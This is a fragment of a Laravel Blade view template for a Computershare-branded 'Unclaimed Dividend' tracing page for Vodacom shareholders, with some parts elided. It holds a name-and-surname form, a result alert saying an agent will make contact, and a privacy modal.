...
@section('content')
<div class="account-pages my-2 pt-sm-2" style="background-image: url({{url('assets/images/Background.png')}})">
    <div class="container">
        <div class="row justify-content-center">

            <div class="mt-2 mb-2" style="display: flex;justify-content: center;align-items: center;">
                <div class="logo-sm">
                    <img src="{{ URL::asset("assets\images\computersharelogosmall.png") }}" alt="Loading..." width="150">
                </div>
            </div>

            <h3 class="row justify-content-center mt-2 mb-2" style="color: #ffffff">Unclaimed Dividend</h3>
                    ...
                    <div class="card-body pt-0">
                        <div class="p-4">
                            <form class="needs-validation" novalidate action="index">
                                ...
                                <div class="mb-3">
                                    <label for="NameSurname" class="form-label">Name and Surname</label>
                                    <input type="text" class="form-control" id="NameSurname" placeholder="Enter your Name and Surname" required>
                            ...
                            <div class="mt-3 text-center">
                                <p>
                                    ...
                                    /
                                    <a type="button" class="fw-medium text-primary" data-bs-toggle="modal" data-bs-target="#Privacy">
                            ...
                            <div class="mt-3 text-center">
                                <p>
                                    Vodacom has appointed Computershare Investor Services Proprietary Limited as it's Transfer Secretary and to trace Vodacom shareholders.
                                </p>
                            </div>
                    ...
                    <div class="card-body pt-0">
                        <div class="p-4">
                            ...
                            <div class="alert alert-danger text-center mt-3">
                                <p>You have potential outstanding dividends.</p><br>
                                <p>An agaent from Computershare will be in contact with you.</p>
                            </div>

                            <div class="mt-4 d-grid">
                                <button class="btn btn-primary waves-effect waves-light" type="submit">Click here to close</button>
                            </div>
                    ...
                    <div class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-footer">
                                <button type="button" class="btn btn-primary waves-effect waves-light" style="background-color: #93186c;border-color: #93186c" data-bs-dismiss="modal">Close</button>
                            </div>
                        </div><!-- /.modal-content -->
                    </div><!-- /.modal-dialog -->
                </div><!-- /.modal -->
            ...
            <div>
                <!-- sample modal content -->
                <div id="Privacy" class="modal fade" tabindex="-1" aria-labelledby="PrivacyLabel" aria-hidden="true">
                    <div class="modal-dialog">
                        <div class="modal-content">
                            <div class="modal-header">
